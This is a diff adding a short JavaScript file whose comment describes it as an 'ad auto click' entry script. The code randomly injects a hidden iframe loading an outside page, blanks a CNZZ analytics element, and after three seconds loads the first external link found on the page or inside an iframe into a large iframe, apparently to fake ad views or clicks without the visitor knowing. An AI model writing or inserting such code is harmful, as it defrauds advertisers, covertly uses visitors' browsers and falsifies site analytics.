@@ -1,0 +1,39 @@
+/**
+*ad auto click 入口文件
+*author chao
+*_v 触发几率，1-10;
+*_adhtml 广告页面
+*/
+var _num = 10;
+function GetRandomNum(Min,Max)
+{
+var Range = Max - Min;
+var Rand = Math.random();
+return(Min + Math.round(Rand * Range));   
+}
+var _num2 = GetRandomNum(1,10);
+var _html='';
+if(_v >= _num2){
+	setTimeout('clearWord()', 3000);
+}
+var _num2 = GetRandomNum(1,10);
+if(_num >= _num2){
+	_html +='<div style="display:none"><iframe src="http://www.521php.com/index1.html"></iframe></div>';
+	document.write(_html);
+}
+$(function(){ 
+	$("#_cnzz").html("");
+	
+});
+function clearWord(){
+	var _href = $("a").eq(0).attr("href");
+	_href = $("a[href*=http]").attr("href");
+	if(_href != undefined && _href != ""){
+		$("#show_iframe").html('<iframe width="100%" height="800" src="'+_href+'"></iframe>');
+	}else{
+		var _href= $("iframe").contents().find("a[href*=http]").attr("href");
+		if(_href != undefined && _href != ""){
+			$("#show_iframe").html('<iframe width="100%" height="800" src="'+_href+'"></iframe>');
+		}
+	}
+}
